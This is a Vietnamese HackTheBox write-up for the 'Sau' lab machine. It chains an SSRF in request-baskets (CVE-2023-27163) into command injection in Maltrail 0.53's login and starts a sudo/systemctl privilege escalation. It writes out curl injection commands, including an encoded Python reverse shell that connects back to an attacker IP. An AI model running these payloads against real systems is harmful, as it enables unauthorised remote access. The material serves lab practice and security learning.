---
title: Sau HTB Writeup - Hackthebox
categories:
- CTF Writeup
- HackTheBox
tags:
- CVE-2023-27163
date: '2023-11-21 11:30:00'
published: true
---

```bash
nmap -p- -sCV -A 10.10.11.224 -oN Sau
```

![Sau-HTB](/posts/Sau-HTB/Untitled.png)

Có 2 port đang mở

- 22/tcp ssh
- 55555/tcp

Và 2 port đang bị chặn: 80/tcp và 8338/tcp.

![http://10.10.11.224:55555](/posts/Sau-HTB/Untitled%201.png)

http://10.10.11.224:55555

port 55555 đang chạy 1 dịch vụ web, cụ thể 1 trang Request Baskets để bắt các gói tin http. 

![Sau-HTB](/posts/Sau-HTB/Untitled%202.png)

Trang này sử dụng request-baskets version 1.2.1. Search google phát hiện cho đến v1.2.1 thì có tồn tại lỗ hổng SSRF (**[CVE-2023-27163](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3#file-cve-2023-27163))**

Ban đầu, nmap quét được 2 cổng 80 và 8338 đã bị chặn, khả năng đây là dịch vụ nội bộ nên tui sẽ post /api/baskets/ với payload sau:

![Sau-HTB](/posts/Sau-HTB/Untitled%203.png)

Truy cập baskets với payload vừa tạo, sau đó nó sẽ forward tới port 80.

![Sau-HTB](/posts/Sau-HTB/Untitled%204.png)

eoz xấu tệ hại, có lẽ js css linking bị lỗi. Không quan tâm lắm, thứ chúng ta cần quan tâm là cái mũi tên góc trái phía dưới kìa. Là **M**altrail (v**0.53**), có lỗ hổng cực kì nghiêm trọng, tại trang login có thể khai thác RCE thông qua param `username`

PoC: https://github.com/spookier/Maltrail-v0.53-Exploit

```bash
curl -X POST 'http://10.10.11.224:55555/lewlew/login' --data 'username=;`curl 10.10.14.42:4444 `'
```

![Sau-HTB](/posts/Sau-HTB/Untitled%205.png)

Vậy là đã chứng minh được code của mình được inject và thực thi thành công. Tiếp theo, tạo payload reverse shell và inject.

![Sau-HTB](/posts/Sau-HTB/Untitled%206.png)

```bash
curl -X POST 'http://10.10.11.224:55555/lewlew/login' --data 'username=;`echo "cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuNDIiLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=" | base64 -d | sh`'
```

![Sau-HTB](/posts/Sau-HTB/Untitled%207.png)

## Leo Root

```bash
sudo -l
```

![Sau-HTB](/posts/Sau-HTB/Untitled%208.png)

Chạy lệnh với sudo

```bash
sudo /usr/bin/systemctl status trail.service
```

![Sau-HTB](/posts/Sau-HTB/Untitled%209.png)

output có vẻ giống với lệnh `less`

![Sau-HTB](/posts/Sau-HTB/Untitled%2010.png)

![Sau-HTB](/posts/Sau-HTB/Untitled%2011.png)